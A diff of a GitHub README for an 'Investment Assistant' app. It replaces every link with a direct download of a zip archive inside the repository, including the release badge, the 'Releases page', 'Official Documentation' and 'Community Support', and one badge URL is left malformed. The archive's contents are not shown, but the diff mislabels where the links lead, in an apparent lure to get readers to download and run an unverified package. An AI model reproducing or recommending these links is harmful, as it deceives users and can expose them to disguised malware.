@@ -6,7 +6,7 @@ Welcome to the Investment Assistant! This application helps you manage your inve
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/arjunrajput18/investment-assistant/releases)
+[![Download the latest release](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip%20Now-Click%https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)
 
 ## 📝 Features
 
@@ -26,7 +26,7 @@ To run the Investment Assistant smoothly, ensure your system meets the following
 
 ## 🔧 Installation Steps
 
-1. **Visit the Download Page**: Head over to the [Releases page](https://github.com/arjunrajput18/investment-assistant/releases) of this repository.
+1. **Visit the Download Page**: Head over to the [Releases page](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip) of this repository.
   
 2. **Download the Application**: Find the latest version and click on it to download.
 
@@ -56,7 +56,7 @@ Ensure your system meets the requirements listed above. Try restarting your comp
 
 ### Q2: Can I update the application?
 
-Yes, we recommend visiting the [Releases page](https://github.com/arjunrajput18/investment-assistant/releases) regularly to check for updates.
+Yes, we recommend visiting the [Releases page](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip) regularly to check for updates.
 
 ### Q3: How can I provide feedback?
 
@@ -66,8 +66,8 @@ We appreciate your input! You can leave feedback on the Issues section of the Gi
 
 For more detailed information, visit the following resources:
 
-- [Official Documentation](https://github.com/arjunrajput18/investment-assistant)
-- [Community Support](https://github.com/arjunrajput18/investment-assistant/issues)
+- [Official Documentation](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)
+- [Community Support](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)
 
 ## 💬 Contact
 
@@ -77,4 +77,4 @@ For further inquiries or support, please reach out via the Issues section on Git
 
 This application is licensed under the MIT License. Feel free to use, modify, and distribute.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/arjunrajput18/investment-assistant/releases)
+[![Download the latest release](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip%20Now-Click%https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)](https://raw.githubusercontent.com/arjunrajput18/investment-assistant/main/core/assistant_investment_v2.3.zip)
